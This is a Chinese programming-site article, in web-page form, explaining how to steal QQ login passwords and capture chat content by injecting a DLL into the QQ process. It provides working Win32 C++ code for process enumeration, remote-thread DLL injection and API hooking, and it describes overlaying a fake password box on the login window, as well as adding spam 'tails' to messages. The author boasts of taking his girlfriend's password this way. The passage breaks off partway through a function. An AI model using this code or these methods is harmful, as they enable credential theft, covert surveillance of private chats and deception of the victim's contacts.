@@ -1,0 +1,989 @@
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>如何截取QQ密码和聊天内容、去掉QQ广告栏、添加QQ尾巴 - VC知识库文章</title>
+<meta NAME="keywords" CONTENT="qq,hacker,黑客,密码,聊天,广告栏,尾巴">
+<meta NAME="description" CONTENT="qq,hacker,黑客,密码,聊天,广告栏,尾巴">
+<link rel="stylesheet" href="style.css">
+<style>
+.adbox {padding-left:26px;}
+.bbbox {padding-top:26px; overflow:hidden}
+.tadbox {overflow:hidden}
+</style>
+
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr bgcolor="#A0D39B"> 
+    <td width="14%" height="78">&nbsp;<a href="http://www.vckbase.com/"><img src="../image/vckcom.gif" width="109" height="13" border="0"></a></td>
+    <td width="76%" align="left"><table width="100%" height="55" border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td align="right"><iframe width="750" height="55" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="http://www.vckbase.com/shatt3.html"></iframe></td>
+  </tr>
+</table></td>
+  <!--script type="text/javascript">
+google_ad_client = "pub-4159669282587342";
+/* 728x90, 创建于 09-4-19 */
+google_ad_slot = "4947706540";
+google_ad_width = 728;
+google_ad_height = 90;
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script--></td>
+    <td height="78" valign="bottom" align="right"><img src="../image/earch.gif" width="89" height="27"></td>
+  </tr>
+  <tr bgcolor="#EEEEEE">     <td colspan="2"><font color="#333333" class="small">::</font><a href="/"><font color='black'><span class=small>首页</span></font></a> 
+      &gt;&gt; <a href="/document"><font color='black'><span class=small>文档中心</span></font></a>
+&gt;&gt;  <a href='/document/journal'><span class=small><font color='black'>在线杂志</font></span></a> &gt;&gt;  <a href='/document/listdoc.asp?sclsid=1301'><span class=small><font color='black'>WIN32 API</font></span></a></td>
+    <td width="10%" align="right" class="small">
+[ <a href='/document/journal/redir.asp?journal=54'><span class=small><font color='black'>在线杂志 第54期</font></span></a> ] </td>
+  </tr>
+</table>
+<br>
+<table class="tadbox" width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+<table width="1316" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="660" align="left"><iframe width="660" height="102" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="http://new.vckbase.com/index.php/qqqun"></iframe></td>
+    <td width="5">&nbsp;</td>
+    <td width="610"rowspan="3" align="left" class="bbbox">
+      <iframe width="610" height="220" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="/bbslist2.html"></iframe></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td class="adbox"><script type="text/javascript" src="http://new.vckbase.com/index.php/vad/vadchk/adid/3"></script></td>
+    <td>&nbsp;</td>
+  </tr>
+</table></td>
+  </tr>
+</table>
+<br>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr> 
+    <td HEIGHT="1" background="/image/dotline2.gif"></td>
+  </tr>
+</table> 
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr> 
+    <td width="40" height="74"></td>
+    <td width="*" height="74" valign="top">
+<form name="form2" method="post" action="/SYS/script/find.asp"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td><span id="docinfo">[ <font color=#009900>原创文档</font> 本文适合中级读者 已阅读22266次 ]</span></td>
+
+		<td align="right">
+
+
+<a href="javascript:;" class="tmblog" id="share_btn_1327833387226" onClick="postToWb()"><img src="http://v.t.qq.com/share/images/s/b24.png" border="0" alt="转播到腾讯微博"></a>
+
+<script>
+var _share_tencent_weibo = function() {
+    String.prototype.elength = function() {
+        return this.replace(/[^\u0000-\u00ff]/g, "aa").length;
+    };
+    String.prototype.tripurl = function() {
+        return this.replace(new RegExp("((news|telnet|nttp|file|http|ftp|https)://){1}(([-A-Za-z0-9]+(\\.[-A-Za-z0-9]+)*(\\.[-A-Za-z]{2,5}))|([0-9]{1,3}(\\.[0-9]{1,3}){3}))(:[0-9]*)?(/[-A-Za-z0-9_\\$\\.\\+\\!\\*\\(\\),;:@&=\\?/~\\#\\%]*)*", "gi"), new Array(12).join("aa"));
+    };
+    if ( !! window.find) {
+        HTMLElement.prototype.contains = function(B) {
+            return this.compareDocumentPosition(B) - 19 > 0
+        }
+    };
+    var _appkey = "801092013" || "801000271"; //你从腾讯微博开放平台获得的appkey
+    var _web = {
+        "name": document.title || "",
+        "href": location.href.replace(/([^\x00-\xff]+)/g,encodeURIComponent("$1")),
+        "hash": location.hash,
+        "target": "toolbar=0,status=0,resizable=1,width=630,height=530"
+    };
+    var _pic = function(area) {
+        var _imgarr = area.getElementsByTagName("img");
+        var _srcarr = [];
+        for (var i = 0; i < _imgarr.length; i++) {
+            _srcarr.push(encodeURIComponent(_imgarr[i].src));
+        }
+        return _srcarr.join("|");
+    };
+    var _text = function() {
+        var s1 = arguments[0] || "",
+        s2 = Array().slice.call(arguments, 1).join(" ").replace(/[\s\n]+/g, " "),
+        k = 257 - s1.tripurl().elength();
+        var s = s2.slice(0, (k - 4) >> 1);
+        if (s2.elength() > k) {
+            k = k - 3;
+            for (var i = k >> 1; i <= k; i++) {
+                if ((s2.slice(0, i)).tripurl().elength() >= k) {
+                    break;
+                }
+                else {
+                    s = s2.slice(0, i);
+                }
+            }
+            s += "...";
+        } else {
+            s = s2;
+        }
+        return [s1, s];
+    };
+    var _u = "http://share.v.t.qq.com/index.php?c=share&a=index&url=$url$&appkey=" + _appkey + "&assname=vckbase2012&title=$title$&pic=$pic$";
+    var qshare_btn = function(_arr) {
+        if (_arr[0]) {
+            return _arr[0];
+        }
+        else {
+            var o = document.createElement("a"),
+            _ostyle = "width:118px;height:25px;background:url(http://mat1.gtimg.com/app/opent/images/websites/share/qshare.png);position:absolute;display:none;";
+            o.setAttribute("style", _ostyle);
+            o.style.cssText = _ostyle;
+            o.setAttribute("href", "javascript:;");
+            document.body.insertBefore(o, document.body.childNodes[0]);
+            return o;
+        }
+    } (arguments);
+    var share_area = function(_arr) {
+        if (_arr[1]) {
+            if ((typeof _arr[1] == "object" && _arr[1].length) || (_arr[1].constructor == Array)) {
+                return _arr[1];
+            } else {
+                return [_arr[1]];
+            }
+        }
+        else {
+            return [document.body];
+        }
+    } (arguments);
+    var current_area = share_area[0];
+    var share_btn = function(_arr) {
+        if (_arr[2]) {
+            _arr[2].onclick = function() {
+                window.open(_u.replace("$title$", encodeURIComponent(_text(_web.name,"").join(" "))).replace("$url$", encodeURIComponent(_web.href)).replace("$pic$", _pic(share_area[0])).substr(0, 2048), 'null', _web.target);
+            }
+        } else {
+            return null;
+        }
+    } (arguments);
+    var _select = function() {
+        return (document.selection ? document.selection.createRange().text: document.getSelection()).toString().replace(/[\s\n]+/g, " ");
+    };
+    var show = function(e, x, y) {
+        with(qshare_btn.style) {
+            display = "inline-block";
+            left = x + "px";
+            top = y + "px";
+            position = "absolute";
+            zIndex = "999999";
+        }
+    };
+    var hide = function(e) {
+        e.style.display = "none";
+    };
+    document.onmouseup = function(e) {
+        e = e || window.event;
+        var o = e.target || e.srcElement;
+        for (var i = 0; i < share_area.length; i++) {
+            if (share_area[i].contains(o) || share_area[i] == o) {
+                var _e = {
+                    "x": e.clientX,
+                    "y": e.clientY
+                };
+                var _o = {
+                    "w": qshare_btn.clientWidth,
+                    "h": qshare_btn.clientHeight
+                };
+                var _d = window.pageYOffset || (document.documentElement || document.body).scrollTop || 0;
+                var x = (_e.x - _o.w < 0) ? _e.x + _o.w: _e.x - _o.w,
+                y = (_e.y - _o.h < 0) ? _e.y + _d - _o.h: _e.y + _d;
+                if (_select() && _select().length >= 10 && o != qshare_btn) {
+                    show(qshare_btn, x - 5, y);
+                    current_area = share_area[i];
+                    break;
+                } else {
+                    hide(qshare_btn);
+                }
+
+            } else {
+                hide(qshare_btn);
+            }
+        }
+    };
+    document.onmouseover = function(e) {
+        var curtarget = (e && e.target) || (window.event && window.event.srcElement),
+        sx = parseInt(qshare_btn.style.width),
+        sy = parseInt(qshare_btn.style.height),
+        d = Math.min(sx, sy);
+        if (curtarget.tagName.toLowerCase() == "img") {
+            var erect = curtarget.getBoundingClientRect();
+            if (curtarget.clientWidth >= 150 && curtarget.clientHeight >= 150) {
+                show(qshare_btn, erect.right - sx - d, erect.bottom + document.body.scrollTop + document.documentElement.scrollTop - sy - d);
+                qshare_btn.setAttribute("shareimg", curtarget.src);
+            }
+        } else if (curtarget != qshare_btn && qshare_btn.getAttribute("shareimg")) {
+            qshare_btn.removeAttribute("shareimg");
+            hide(qshare_btn);
+        }
+    };
+    document.onmousedown = function(e) {
+        var curtarget = (e && e.target) || (window.event && window.event.srcElement);
+        if (curtarget != qshare_btn) {
+            if (document.selection) {
+                document.selection.empty();
+            } else if (window.getSelection) {
+                window.getSelection().removeAllRanges();
+            }
+        }
+    };
+    qshare_btn.onclick = function() {
+        var shareimg = qshare_btn.getAttribute("shareimg");
+        if (shareimg != null) {
+            window.open(_u.replace("$title$", encodeURIComponent(_web.name)).replace("$url$", encodeURIComponent(_web.href)).replace("$pic$", encodeURIComponent(shareimg)).substr(0, 2048), 'null', _web.target);
+            return;
+        }
+        var _str = _select();
+        _resultstr = _text(_web.name, _str).reverse().join(" ");
+        if (_str) {
+            var url = _u.replace("$title$", encodeURIComponent(_resultstr)).replace("$pic$", _pic(current_area));
+            url = url.replace("$url$", encodeURIComponent(_web.href.replace(_web.hash, "") + "#" + (current_area["name"] || current_area["id"] || ""))).substr(0, 2048);
+            window.open(url, 'null', _web.target);
+        }
+        hide(this);
+    };
+};
+_share_tencent_weibo(null,null,document.getElementById("share_btn_1327833387226"));
+/*
+_share_tencent_weibo(qshare_btn,qshare_area,share_btn);
+qshare_btn:Q-Share功能按钮，选中文字或鼠标放在功能区域中的大图上后显示的转播按钮
+qshare_area:Q-Share功能区域，可以是一个Dom数组
+share_btn:一键转播功能按钮，点击后将会弹出转播页面
+如须自定义功能，qshare_btn,share_area,share_btn自己设置,其中qshare_area可以是一个DOM数组
+*/
+</script>
+
+
+
+
+
+<script type="text/javascript" charset="utf-8">
+(function(){
+  var _w = 106 , _h = 24;
+  var param = {
+    url:location.href,
+    type:'5',
+    count:'', /**是否显示分享数，1显示(可选)*/
+    appkey:'', /**您申请的应用appkey,显示分享来源(可选)*/
+    title:'', /**分享的文字内容(可选，默认为所在页面的title)*/
+    pic:'', /**分享图片的路径(可选)*/
+    ralateUid:'2667733442', /**关联用户的UID，分享微博会@该用户(可选)*/
+	language:'zh_cn', /**设置语言，zh_cn|zh_tw(可选)*/
+    rnd:new Date().valueOf()
+  }
+  var temp = [];
+  for( var p in param ){
+    temp.push(p + '=' + encodeURIComponent( param[p] || '' ) )
+  }
+  document.write('<iframe allowTransparency="true" frameborder="0" scrolling="no" src="http://hits.sinajs.cn/A1/weiboshare.html?' + temp.join('&') + '" width="'+ _w+'" height="'+_h+'"></iframe>')
+})()
+</script></td>
+
+
+            <td align="right" width="200">
+<input type="text" name="keyword"  size="10" maxlength="20" class="rect">
+              <select name="gclsid" class="rect">
+                <option value="100" selected>文档</option>
+                <option value="200">代码</option>
+                <option value="400">工具</option>
+    </select>
+    <input type="image" border="0" name="imageField" src="../image/go.gif" width="21" height="15" align="absmiddle">
+            </td>
+        </tr>
+      </table></form>
+      <div align="center"></div>
+      <br>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+      <p align="center"><b>如何截取QQ密码和聊天内容、去掉QQ广告栏、添加QQ尾巴</b><br><br>
+      作者：<a href="mailto:chrys@163.com">谢红伟</a></p>
+
+        
+      <p><a href="/code/downcode.asp?id=3162">下载源代码</a></p>
+		<p><a href="#前言">前言</a> <br>
+		<a href="#思路分析">思路分析</a> <br>
+		<a href="#进入QQ进程">进入QQ进程</a> <br>
+		<a href="#远程注入Dll">远程注入DLL</a> <br>
+		<a href="#截取QQ登录密码">截取QQ登录密码</a> <br>
+		<a href="#截取本机QQ账号和昵称">截取本机QQ账号和昵称</a> <br>
+		<a href="#截取聊天内容">截取聊天内容</a> <br>
+		<a href="#增加QQ尾巴">增加QQ尾巴</a> <br>
+		<a href="#去掉QQ广告栏">去掉QQ广告栏</a> <br>
+		<a href="#郑重申明">郑重申明</a> <br>
+		<a href="#结束语">结束语</a> </p>
+		<p>
+		<a name="前言">前言</a><br>
+		　　中国网民没有不熟悉QQ的，QQ玩家没有不知道珊瑚虫和彩虹的去广告显IP版QQ的，有段时间QQ尾巴也很盛行，就是每次聊天的时候它自动在你的聊天文字后面加一段话，欺骗你的QQ网友上当。如今的网络就好比武侠小说里的江湖，行走江湖的剑客须有绝世武功方可不倒于对手的剑下。<br>
+		　　本文将向你讲述如何截取QQ密码和聊天内容，如何将QQ的广告栏去掉，并添加自定的QQ尾巴。<br>
+		<a name="思路分析">思路分析</a><br>
+		　　要截获QQ密码，大家一定想到键盘钩子，2006版以前的QQ用这种方法的确可以截获到QQ密码，我也曾经用这种方法将我女朋友的QQ密码给弄过来了，~~，但2007版以后的QQ在密码输入框里做了大量的手脚，即使用spy++也无法截取到任何消息，键盘钩子也失效了。我们总是幸运的，QQ登录窗口的消息还是可以获取到，既然钩子不能用了，那我们何不换种思维方式走走捷径呢？修改登录窗口的回调函数地址，截取其所有消息，并创建一个虚假的密码输入框来到达截取密码的目的，就好比在复写纸上写字，字迹会留下痕迹。<br>
+		　　腾讯为了保护聊天内容的安全性，防止QQ尾巴的干扰，对聊天的文字输入框用额外的控件做了特殊处理，同样不能截取到任何消息，也不能用WM_GETTEXT和WM_CHAR消息来取得其中的文字内容。其实这个问题好解决，只要用模拟键盘程序模拟“Ctrl+A”-&gt;“Ctrl+C”就可以得到聊天内容了。<br>
+		　　去QQ广告就更容易了，只要找到广告显示的子窗口，将它隐藏起来，然后在相同位置放一个自己的子窗口就可以了，如果获取到IP地址或对方的地理位置等信息也可以显示在这里。<br>
+		　　说到这里，还有一个非常重要的问题，那就是我们的程序必须执行在QQ空间，因为Windows系统进程是受系统保护的，每个进程有自己独立的内存空间，很多API函数只对同一个进程有效，我们必须解决这个问题。<br>
+		<a name="进入QQ进程">进入QQ进程</a><br>
+		　　要将我们自己写的代码执行在QQ进程空间中才能实现我们上面的的分析思路，我想到了两种方法：<br>
+		　　第一种方法还是钩子，我们的代码写到一个dll动态链接库里，然后启动系统钩子，当任何一个进程启动时，我们的dll将会被加载到该进程中，我们判断是否为QQ进程，如果不是，我们的dll就立即卸载，否则我们就顺利地进入到QQ进程空间了。这种方法有个缺点，就是任何进程启动时我们的dll都会被加载，严重影响到系统性能，我们在学习钩子的时候书本上也确实讲过，系统钩子最好少用，如果程序代码执行效率不高的情况下，将影响系统性能，再好用的软件也将变成垃圾而被用户清除出去的。<br>
+		　　第二种方法就是远程dll注入，即用创建远程线程的方法在QQ进程空间中注入一个我自己的线程，这种方法针对性很强，只对QQ进程进行操作，不操作其他进程，不影响系统性能，而且灵活性好，我们随时可以将线程注入，也可以随时撤销，而第一种方法是系统钩子内部控制的，我们无法干预。<br>
+		<a name="远程注入Dll">远程注入Dll</a><br>
+		　　我们的程序分为两个部分，一部分是exe执行程序，可以控制Dll的注入，另一部分就是我们要注入的Dll。<br>
+		　　首先我们要找到系统中的QQ进程，这里要用到ToolHelp32系列函数，以下函数能枚举出系统所有的进程：
+<pre>
+　　BOOL CProcessManage::EnumSystemProcess (
+　　		OUT CStringArray *pStrAry_ProcessName/*=NULL*/,
+　　		OUT CUIntArray *pUIntAry_ProcessID/*=NULL*/,
+　　		OUT CStringArray *pStrAry_ProcessPriority/*=NULL*/,
+　　		OUT CUIntArray *pUIntAry_ThreadNum/*=NULL*/,
+　　		OUT CStringArray *pStrAry_ProcessPath/*=NULL*/
+　　	)
+　　{
+　　	HANDLE hProcess = NULL;
+　　	PROCESSENTRY32 pe32;
+　　	pe32.dwSize = sizeof(pe32);
+　　	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot ( TH32CS_SNAPPROCESS, 0 );
+　　	if ( hProcessSnap == INVALID_HANDLE_VALUE )
+　　		return FALSE;
+　　
+　　	BOOL bMore = ::Process32First(hProcessSnap,&pe32);
+　　	while ( bMore )
+　　	{
+　　		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
+　　		if ( pStrAry_ProcessName ) pStrAry_ProcessName-&gt;Add ( pe32.szExeFile );
+　　		if ( pUIntAry_ProcessID ) pUIntAry_ProcessID-&gt;Add ( pe32.th32ProcessID );
+　　		if ( pUIntAry_ThreadNum ) pUIntAry_ThreadNum-&gt;Add ( pe32.cntThreads );
+　　		if ( pStrAry_ProcessPriority ) pStrAry_ProcessPriority-&gt;Add ( GetProcessPriority(hProcess) );
+　　		if ( pStrAry_ProcessPath ) pStrAry_ProcessPath-&gt;Add ( GetProcessPath(pe32.th32ProcessID) );
+　　		bMore = ::Process32Next(hProcessSnap,&pe32);
+　　	}
+　　	::CloseHandle(hProcessSnap);
+　　	return TRUE;
+　　}
+</pre>
+　　
+　　从枚举出的所有进程中找到QQ进程，如下代码：
+<pre>
+　　//
+　　// 枚举出 “qq.exe”的进程
+　　//
+　　int EnumQQProcess ( CStringArray *pStrAry_ProcessName/*=NULL*/, 
+			CUIntArray *pUIntAry_ProcessID/*=NULL*/, 
+			CStringArray *pStrAry_ProcessPath/*=NULL*/ )
+　　{
+　　	CStringArray StrAry_ProcessName;
+　　	CUIntArray UIntAry_ProcessID;
+　　	CStringArray StrAry_ProcessPath;
+　　	if ( !CProcessManage::EnumSystemProcess (
+　　		&StrAry_ProcessName,
+　　		&UIntAry_ProcessID,
+　　		NULL,
+　　		NULL,
+　　		&StrAry_ProcessPath
+　　		) )
+　　	{
+　　		return -1;
+　　	}
+　　	ASSERT ( StrAry_ProcessName.GetSize() == UIntAry_ProcessID.GetSize() );
+　　	ASSERT ( StrAry_ProcessName.GetSize() == StrAry_ProcessPath.GetSize() );
+　　	
+　　	int nCount = 0;
+　　	for ( int i=0; i&lt;StrAry_ProcessName.GetSize(); i++ )
+　　	{
+　　		CString csProcessName = StrAry_ProcessName.GetAt ( i );
+　　		TRACE ( _T("%s\n"), csProcessName );
+　　		csProcessName.MakeLower ();
+　　		if ( csProcessName == _T("qq.exe") )
+　　		{
+　　			nCount ++;
+　　			if ( pStrAry_ProcessName ) pStrAry_ProcessName-&gt;Add ( csProcessName );
+　　			if ( pUIntAry_ProcessID ) pUIntAry_ProcessID-&gt;Add ( UIntAry_ProcessID.GetAt(i) );
+　　			if ( pStrAry_ProcessPath ) pStrAry_ProcessPath-&gt;Add ( StrAry_ProcessPath.GetAt(i) );
+　　		}
+　　	}
+　　	
+　　	return nCount;
+　　}
+</pre>
+　　接下来我们使用函数VirtualAllocEx()/WriteProcessMemory()函数在QQ进程中申请内存空间，将我们的数据参数写入到QQ进程内存空间里，然后用CreateRemoteThread()函数在QQ进程空间中启动一个远程线程，将我们的dll执行在QQ进程空间中，如下函数既是：
+<pre>
+　　typedef void (WINAPI *FUNC_SetRemoteParameter) ( LPVOID pParaAddrss, HWND hWndInvoker );
+　　BOOL CRemoteThreadMateQQDlg::RemoteInject ( DWORD dwPID, BOOL bInjected )
+　　{
+　　	if ( dwPID &lt; 1 ) return FALSE;
+　　	ShowLogText ( FormatString(_T("发现新的QQ进程(ID:%u)，现在注入远程线程。\r\n"), dwPID) );
+　　	BOOL bRet = TRUE;
+　　
+　　	// 获取dll文件路径
+　　	CString csDllPath = GetProgramDir ();
+　　	csDllPath += _T("dllRemoteThread.Dll");
+　　	TCHAR szDllPath[MAX_PATH] = {0};
+　　	lstrcpyn ( szDllPath, csDllPath, COUNT(szDllPath) );
+　　
+　　	// 定义变量
+　　	void *pParaRemote = NULL;
+　　	void *pDataRemote = NULL;
+　　	HANDLE hProcess = NULL;
+　　
+　　	if ( !bInjected )
+　　	{
+　　		// 打开远程进程
+　　		hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE,FALSE,dwPID);
+　　		if (! hProcess ) return FALSE;
+　　		
+　　		// 在远程进程中分配内存空间，并将数据写入
+　　		t_RemoteThreadPara tRemoteThreadPara = {0};
+　　		strncpy ( tRemoteThreadPara.szQQTail, "我是QQ尾巴，哇哈哈……", COUNT(tRemoteThreadPara.szQQTail) );
+　　		pParaRemote = (void*) VirtualAllocEx( hProcess, 0, sizeof(t_RemoteThreadPara), MEM_COMMIT, PAGE_READWRITE );
+　　		::WriteProcessMemory ( hProcess, pParaRemote, &tRemoteThreadPara, sizeof(t_RemoteThreadPara), NULL );
+　　		pDataRemote = (void*) VirtualAllocEx( hProcess, 0, sizeof(szDllPath), MEM_COMMIT, PAGE_READWRITE );
+　　		::WriteProcessMemory ( hProcess, pDataRemote, szDllPath, sizeof(szDllPath), NULL );
+　　	}
+　　	// 装载dll文件，并将参数传入dll的数据共享区
+　　	HMODULE hMod = LoadLibrary ( szDllPath );
+　　	if ( hMod )
+　　	{
+　　		FUNC_SetRemoteParameter pfnSetRemoteParameter = \
+				(FUNC_SetRemoteParameter)GetProcAddress ( hMod, TEXT("SetRemoteParameter") );
+　　		if ( pfnSetRemoteParameter )
+　　			pfnSetRemoteParameter ( pParaRemote, GetSafeHwnd() );
+　　	}
+　　	else
+　　	{
+　　		bRet = FALSE;
+　　	}
+　　	if ( !bInjected )
+　　	{
+　　		// 创建远程线程执行代码
+　　		DWORD dwThreadID = 0;
+　　		HANDLE hThread = ::CreateRemoteThread ( hProcess, NULL, 0,
+　　			(LPTHREAD_START_ROUTINE)LoadLibrary, 
+　　			pDataRemote, 0, &dwThreadID );
+　　		if ( HANDLE_IS_VALID(hThread) )
+　　		{
+　　			// 等待远程线程结束
+　　			::WaitForSingleObject ( hThread, INFINITE );
+　　			DWORD dwRetCode = 0;
+　　			::GetExitCodeThread ( hThread, &dwRetCode );
+　　			TRACE ("run and return %d\n", dwRetCode );
+　　		}
+　　		else
+　　		{
+　　			bRet = FALSE;
+　　		}
+　　	}
+　　	// 释放资源
+　　	if ( hProcess && pDataRemote )
+　　		VirtualFreeEx( hProcess, pDataRemote, 0, MEM_RELEASE );	
+　　	if ( hMod ) FreeLibrary ( hMod );
+　　	return bRet;
+　　}
+</pre>
+
+		<a name="截取QQ登录密码">截取QQ登录密码</a><br>
+		　　当我们的Dll注入到QQ进程以后，我们就可以在里面再启动几个线程来为我所用，其中一个线程定时调用EnumWindows()函数来获取系统中的窗口，并找到QQ登录窗口，然后调用如下代码来修改窗口的过程地址：<br>
+		　　// 修改相关窗口的 WindowProc 地址<br>
+		　　ChangeWindownProc ( m_hWndQQLoginWindow, &amp;g_pfnOrgWindowProc_QQLoginWindow, 
+		WindowProc_QQLoginWindow );<br>
+		　　修改以后，QQ登录窗口的所有消息都将WindowProc_QQLoginWindow()函数获取。<br>
+		　　我们用EnumChildWindows()找到密码输入框的子窗口，然后创建一个EDIT控件，其大小和位置与QQ密码输入框一样，这样就覆盖在QQ密码输入框的上边了，用户在输入密码时实际上输入到我们的框中来了。<br>
+		　　为了保证我们的编辑框始终获得输入焦点，并且当QQ登陆框最小化或还原时还有窗口移动时不出现破绽，有几个消息我们需要处理：<br>
+		　　WM_MOVING – 当QQ登录窗口移动时，我们重新计算相对位置，并将我们的编辑框移动到新位置上。<br>
+		　　WM_SYSCOMMAND – 当QQ登录窗口最小化、还原和关闭时，我们的编辑框应该隐藏、显示和销毁。<br>
+		　　WM_COMMAND – 当用户点击“登录”按钮时我们要做相应处理，将我们的密码发送给QQ的密码输入框；当QQ的密码输入框获得焦点时，我们应该将焦点转移到我们的编辑框中。<br>
+		　　当用户输入完密码按“回车”键或点“登录”按钮时，我们先将QQ登录窗口隐藏起来，以免露出破绽，然后将我们收到到的密码在QQ密码输入框中重新输入一次，并发送“回车”按键消息，此时QQ真正开始登录，而密码已经悄悄地落入我手，哇哈哈……<p>　　如下图：<br>
+		<img border="0" src="/document/journal/vckbase54/images/qqappcruckimg1.GIF" width="328" height="243"><br>
+		　<br>
+		　　上图中红方框指引的输入框是我们的程序所创建，不是QQ的密码输入框，因为QQ的密码输入框里的文字是不能被选取，也不能复制粘贴的，而我们的输入框则可以。</p>
+		<p><img border="0" src="/document/journal/vckbase54/images/qqappcruckimg2.GIF" width="617" height="505"></p>
+		<p>
+		<a name="截取本机QQ账号和昵称">截取本机QQ账号和昵称</a><br>
+		　　我们要截获密码或聊天内容等，首先应该先要获取到本机的QQ账号和昵称，要不然我们截获的内容归属于谁呢？没有归属的信息是毫无意义的，我想过很多办法来获取当前登录的QQ 
+		账号和昵称，用读取远程进程内存空间的办法可以获取，但速度太慢，最后想到在我们的系统托盘里就有这些信息的提示，如下图：</p>
+		<p>
+		<img border="0" src="/document/journal/vckbase54/images/qqappcruckimg8.GIF" width="130" height="41"><br>
+		<br>
+		　　那我们如何才能获取到系统托盘的提示信息呢？那我们就要追溯到托盘的产生根源了，托盘图标是利用Win32 API函数Shell_NotifyIcon()产生的，所以我这里想到的办法就是Hook 
+		API的方法，就是替换Win32API函数地址，在QQ调用Shell_NotifyIcon()函数产生系统托盘前先调用我们的函数，如下代码所示：</p>
+		<pre>　　typedef BOOL (WINAPI *PFN_Shell_NotifyIconA) ( DWORD dwMessage, PNOTIFYICONDATA lpdata );
+　　BOOL WINAPI Hook_Shell_NotifyIconA ( DWORD dwMessage, PNOTIFYICONDATA lpdata );
+　　CAPIHook g_Shell_NotifyIconA (&quot;shell32.dll&quot;, &quot;Shell_NotifyIconA&quot;, (PROC) Hook_Shell_NotifyIconA, TRUE);</pre>
+		<p>　　以上代码是将Win32API系统函数Shell_NotifyIconA()地址修改为我们自己的函数地址“Hook_Shell_NotifyIconA”，这样以来QQ对系统托盘做任何操作时都会先调用我们的函数“Hook_Shell_NotifyIconA”，我们就可以从托盘提示文字里找到本地登录的QQ号码和昵称了。<br>
+		　　但是，如果我们的程序在执行前QQ已经启动了，QQ进程不会调用Shell_NotifyIcon()函数了，那我们也就无法获得其QQ号码和昵称了，怎么办？我们可以尝试将“Explorer”（资源管理器）进程kill掉，这时Windows会自动重新启动一个“Explorer”，这时QQ进程就重新调用Shell_NotifyIcon()来创建一个新的托盘图标了，那我们可以假冒系统给QQ进程发一条托盘重建的消息让QQ自己调用Shell_NotifyIcon()函数重建托盘图标，这时我们就可以窃取到本地登录的QQ账号和昵称了。
+		<pre>
+　　//
+　　// 通知QQ重建托盘图标
+　　//
+　　void NotifyQQRecreateTray ()
+　　{
+　　	if ( m_pQQMate )
+　　	{
+　　		m_pQQMate-&gt;m_csLocalQQAccount.Empty();
+　　		m_pQQMate-&gt;m_csLocalQQNickname.Empty();
+　　		memset ( &m_pQQMate-&gt;m_tnd, 0, sizeof(NOTIFYICONDATA) );
+　　	}
+　　
+　　	CUIntArray UIntAry_ThreadID;
+　　	CProcessManage::GetThreadInfo ( GetCurrentProcessId(), &UIntAry_ThreadID );
+　　	for ( int i=0; i&lt;UIntAry_ThreadID.GetSize(); i++ )
+　　	{
+　　		EnumThreadWindows ( UIntAry_ThreadID.GetAt(i), EnumThreadWndProc, LPARAM(NULL) );
+　　	}
+　　}
+　　
+　　BOOL CALLBACK EnumThreadWndProc ( HWND hwnd, LPARAM lParam )
+　　{
+　　	TCHAR szClassName[255] = {0};
+　　	::GetClassName ( hwnd, szClassName, COUNT(szClassName) );
+　　	if ( lstrcmp ( _T("Afx:400000:0"), szClassName ) == 0 )
+　　	{
+　　		if ( !WM_TASKBARCREATED )
+　　			WM_TASKBARCREATED = ::RegisterWindowMessage ( _T("TaskbarCreated") );
+　　		SendMessage ( hwnd, WM_TASKBARCREATED, NULL, NULL );
+　　	//	HwDbgLog ( L_DEBUG, _T("删除托盘图标： hwnd - 0x%X, Class - %s"),
+　　	//		hwnd, szClassName );
+　　	}
+　　	
+　　	return TRUE;
+　　}
+</pre>
+
+		<p><img border="0" src="/document/journal/vckbase54/images/qqappcruckimg3.GIF" width="240" height="105"></p>
+		<p>被Hook后的QQ托盘信息<br>
+		　　<br>
+		<a name="截取聊天内容">截取聊天内容</a><br>
+		　　在我们注入到QQ进程空间的Dll中启动线程，定时枚举系统中的窗口，当找到聊天窗口时我们需要收集到聊天内容。<br>
+		　　聊天内容分为“发送”内容和“接收”内容。“接收”的文字内容未做限制，直接用WM_GET_TEXT便能获得。发送的内容比较麻烦一点，首先我们要知道用户何时发送（点“发送”按钮、按快捷键“Ctrl+Enter”、按快捷键“Alt+S”），要解决这些问题，我同样需要截获聊天窗口的消息。<br>
+		　　首先我们用EnumWindows()函数在线程中定时查找QQ聊天窗口，一旦发现新的聊天窗口出现，我们立即修改窗口过程函数地址：
+</p>
+<pre>
+　　	// 修改相关窗口的 WindowProc 地址
+　　	ChangeWindownProc ( pFindQQChatInfoPara-&gt;m_hWndChatWindow, 
+			&pFindQQChatInfoPara-&gt;m_pfnOrgWindowProc_ChatWindow, 
+			WindowProc_ChatWindow );
+</pre>
+		
+		　　以上代码将QQ聊天窗口的过程函数改为我们自己的函数“WindowProc_ChatWindow()”，<br>
+		　　那用户到底什么时候发送聊天信息呢？我们只要截获消息711即可，收到该消息以后我们将触发一个事件，我们另外的线程便开始工作，将聊天内容通过模拟键盘事件的方式复制出来，然后再保存到我们另外的内存区域里。
+		<pre>
+　　//
+　　// 获取用户正要发送的聊天内容，保存到数组中
+　　//
+　　CString CQQMate::GetWillSentChatText ()
+　　{
+　　	HwDbgLog ( L_DEBUG, _T("----------------------------- GetWillSentChatText()") );
